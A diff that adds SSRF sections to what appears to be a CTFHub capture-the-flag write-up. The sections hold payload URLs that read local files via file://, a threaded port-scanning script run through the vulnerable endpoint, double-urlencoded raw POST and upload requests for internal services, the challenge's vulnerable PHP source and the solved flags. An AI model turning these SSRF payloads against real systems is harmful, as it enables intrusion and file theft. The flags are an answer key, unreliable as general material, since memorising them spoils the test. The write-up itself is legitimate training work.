@@ -1017,3 +1017,180 @@ Accept-Language: en-US
 ```
 
 flag: `ctfhub{926b6edd12dc83ff9f4f8d29}`
+
+### SSRF - 内网访问
+
+```
+http://challenge-ed3e196ba3bb7a32.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php
+```
+
+flag: `ctfhub{6cb292d1e9cae393ef545516}`
+
+### SSRF - 伪协议读取文件
+
+```
+http://challenge-4b6547d8234d78c8.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
+```
+
+flag: `ctfhub{b32e088b3d1c052ad448a974}`
+
+### SSRF - 端口扫描
+
+```python
+import requests
+import queue
+import threading
+import time
+
+import requests.adapters
+
+urls = [f"http://challenge-d143edf32bd6d1cf.sandbox.ctfhub.com:10800/?url=http://127.0.0.1:{port}" for port in range(8000, 9000)]
+
+retry_strategy = requests.adapters.Retry(total=3, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["GET"])
+session = requests.Session()
+adapter = requests.adapters.HTTPAdapter(max_retries=retry_strategy)
+session.mount("http://", adapter)
+
+stop_event = threading.Event()
+
+qu = queue.Queue()
+for url in urls: qu.put(url)
+
+num_threads = 6
+
+def worker() -> None:
+    while not qu.empty() and not stop_event.is_set():
+        url = qu.get()
+        resp = session.get(url)
+        if resp.headers.get('Content-Length') != '0':
+            stop_event.set()
+            print(f"Found: {url}")
+            break
+        print(f"\r{len(urls) - qu.qsize()}/{len(urls)}", end='')
+
+def main() -> None:
+    threads = [threading.Thread(target=worker) for _ in range(num_threads)]
+    for thread in threads: thread.start()
+    for thread in threads: thread.join()
+
+if __name__ == '__main__':
+    main()
+```
+
+flag: `ctfhub{dd96c7727790ed6e30630ade}`
+
+### SSRF - POST 请求
+
+先读取源代码
+
+```
+http://challenge-c67d7344553cd3c4.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php
+```
+
+```php
+<?php
+
+error_reporting(0);
+
+if (!isset($_REQUEST['url'])){
+    header("Location: /?url=_");
+    exit;
+}
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_exec($ch);
+curl_close($ch);
+```
+
+```
+http://challenge-c67d7344553cd3c4.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php
+```
+
+```php
+<?php
+
+error_reporting(0);
+
+if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
+    echo "Just View From 127.0.0.1";
+    return;
+}
+
+$flag=getenv("CTFHUB");
+$key = md5($flag);
+
+if (isset($_POST["key"]) && $_POST["key"] == $key) {
+    echo $flag;
+    exit;
+}
+?>
+
+<form action="/flag.php" method="post">
+<input type="text" name="key">
+<!-- Debug: key=<?php echo $key;?>-->
+</form>
+```
+
+构造请求：，然后 urlencode 两次
+
+```python
+from urllib.parse import quote
+
+payload: str = """POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=54f8ae799cfcbe8bec4af0f3d5c43bcb
+"""
+
+def main() -> None:
+    out = payload.replace('\n', '\r\n')
+    out = quote(out)
+    out = quote(out)
+    print(out)
+
+if __name__ == '__main__':
+    main()
+```
+
+flag: `ctfhub{750677e121b4809a5aa7dd71}`
+
+### SSRF - 上传文件
+
+```python
+from urllib.parse import quote
+
+payload: str = """POST /flag.php HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: multipart/form-data; boundary=BOUNDARY
+Content-Length: 120
+
+--BOUNDARY
+Content-Disposition: form-data; name="file"; filename="file"
+Content-Type: text/plain
+
+123
+--BOUNDARY--
+"""
+
+def main() -> None:
+    out = payload.replace('\n', '\r\n')
+    out = quote(out)
+    out = quote(out)
+    print(out)
+
+if __name__ == '__main__':
+    main()
+```
+
+flag: `ctfhub{a6723782f8ad2c52604d0def}`
+
+### SSRF - FastCGI 协议
+
+
+### SSRF - 数字 IP bypass
+
